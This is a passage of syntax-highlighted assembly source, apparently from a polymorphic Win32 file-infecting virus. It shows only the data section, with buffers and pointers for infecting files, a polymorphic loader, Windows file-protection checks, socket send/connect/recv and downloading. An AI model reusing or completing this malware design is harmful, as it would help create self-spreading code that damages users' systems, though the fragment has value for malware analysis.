   </span><span class="sc5">thrcontext</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
              </span><span class="sc9">even</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2048</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; should be in the 1st page</span><span class="sc0">
   </span><span class="sc5">end_of_my_stack</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">aplib@013</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@009</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@017</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@014</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@004</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@003</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@086</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@015</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@005</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@016</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">tmapix</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">InitTmTable</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">GetTmElementByIndex</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">CloseTmTable</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">sfc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">SfcIsFileProtected</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">w_mutex@002</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   HANDLE CreateMutex()</span><span class="sc0">
   </span><span class="sc5">w_mutex@003</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   HANDLE FindFirstFile()</span><span class="sc0">

   </span><span class="sc5">w_buffer@001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;   General purposes, filename is the most important</span><span class="sc0">
   </span><span class="sc5">w_buffer@002</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">  </span><span class="sc1">;   blah</span><span class="sc0">
   </span><span class="sc5">w_buffer@003</span><span class="sc0"> </span><span class="sc5">OSVERSIONINFO</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">    </span><span class="sc1">;   blah</span><span class="sc0">
   </span><span class="sc5">w_buffer@004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;   Internet and GetLogicalDriveStrings()</span><span class="sc0">
   </span><span class="sc5">w_buffer@005</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;   Name of this file (don't changes)</span><span class="sc0">
   </span><span class="sc5">w_buffer@006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;   WSOCK32 routine</span><span class="sc0">
   </span><span class="sc5">w_buffer@007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;   Temporary name while infecting</span><span class="sc0">

   </span><span class="sc5">w_handle@001</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   HANDLE CreateFile</span><span class="sc0">
   </span><span class="sc5">w_handle@002</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   File size</span><span class="sc0">
   </span><span class="sc5">w_handle@003</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   HANDLE &lt;CreateFileMapping&gt;</span><span class="sc0">
   </span><span class="sc5">w_handle@004</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   HANDLE &lt;MapViewOfFile&gt;</span><span class="sc0">
   </span><span class="sc5">w_handle@007</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Usado na IT</span><span class="sc0">
   </span><span class="sc5">w_handle@008</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   mapped file attributes</span><span class="sc0">
   </span><span class="sc5">w_handle@009</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">FILETIME</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">FILETIME</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">w_handle@010</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">w_handle@011</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Where is the EXE in the memory (same to the disk)</span><span class="sc0">
   </span><span class="sc5">w_handle@012</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Tell if the file must be opened in</span><span class="sc0">
                       </span><span class="sc1">;   read-only mode | read/write (NULL)</span><span class="sc0">
   </span><span class="sc5">w_handle@013</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Where is the .EXE packed in memory</span><span class="sc0">
   </span><span class="sc5">w_handle@015</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   IT starts</span><span class="sc0">
   </span><span class="sc5">w_handle@019</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   HANDLE GlobalAlloc</span><span class="sc0">
   </span><span class="sc5">w_ionumb@002</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Offset PE header (without memory value)</span><span class="sc0">
   </span><span class="sc5">w_ionumb@003</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Offset first section</span><span class="sc0">
   </span><span class="sc5">w_ionumb@005</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Import table in file</span><span class="sc0">
   </span><span class="sc5">w_ionumb@006</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Where loader starts in the new file</span><span class="sc0">
   </span><span class="sc5">w_ionumb@007</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   HANDLE RegOpenKey ou something like</span><span class="sc0">
   </span><span class="sc5">w_ionumb@009</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Offset para header da primeira secao</span><span class="sc0">
   </span><span class="sc5">w_ionumb@011</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   How much space we still have after compress code (in file)</span><span class="sc0">
   </span><span class="sc5">w_ionumb@013</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   Polymorphic-engines address</span><span class="sc0">

   </span><span class="sc5">m_handle@001</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   onde comeÁa o novo arquivo (handle GlobalAlloc)</span><span class="sc0">
   </span><span class="sc5">m_handle@002</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   offset p/ nome da primeira secao</span><span class="sc0">
</span><span class="sc1">;   m_handle@003 dd ?   ;   tamanho compactado da primeira secao</span><span class="sc0">
   </span><span class="sc5">m_handle@004</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   novo tamanho da primeira secao no arquivo (rnd)</span><span class="sc0">
</span><span class="sc1">;   m_handle@005 dd ?   ;   tamanho compactado da secao .data</span><span class="sc0">
   </span><span class="sc5">m_handle@006</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   novo tamanho da secao .data no arquivo (rnd)</span><span class="sc0">
   </span><span class="sc5">m_handle@007</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   tamanho da secao do loader polimorfico no arquivo (fixo)</span><span class="sc0">
   </span><span class="sc5">m_handle@008</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;   </span><span class="sc0">

   </span><span class="sc5">fsize3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">         </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">wsock32_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_send_2_ch</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_connect_2_ch</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_recv_2_ch</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">kme3_out_entry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">kme3_out_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">IMAGEHLP</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ap_SearchTreeForFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">WININET</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ap_InternetGetConnectedState</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">handle@010</span><span class="sc0"> </span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">handle@011</span><span class="sc0"> </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">

   </span><span class="sc5">download</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">convert@006</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">aplib@010</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">workmem</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">640</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0">
   </span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
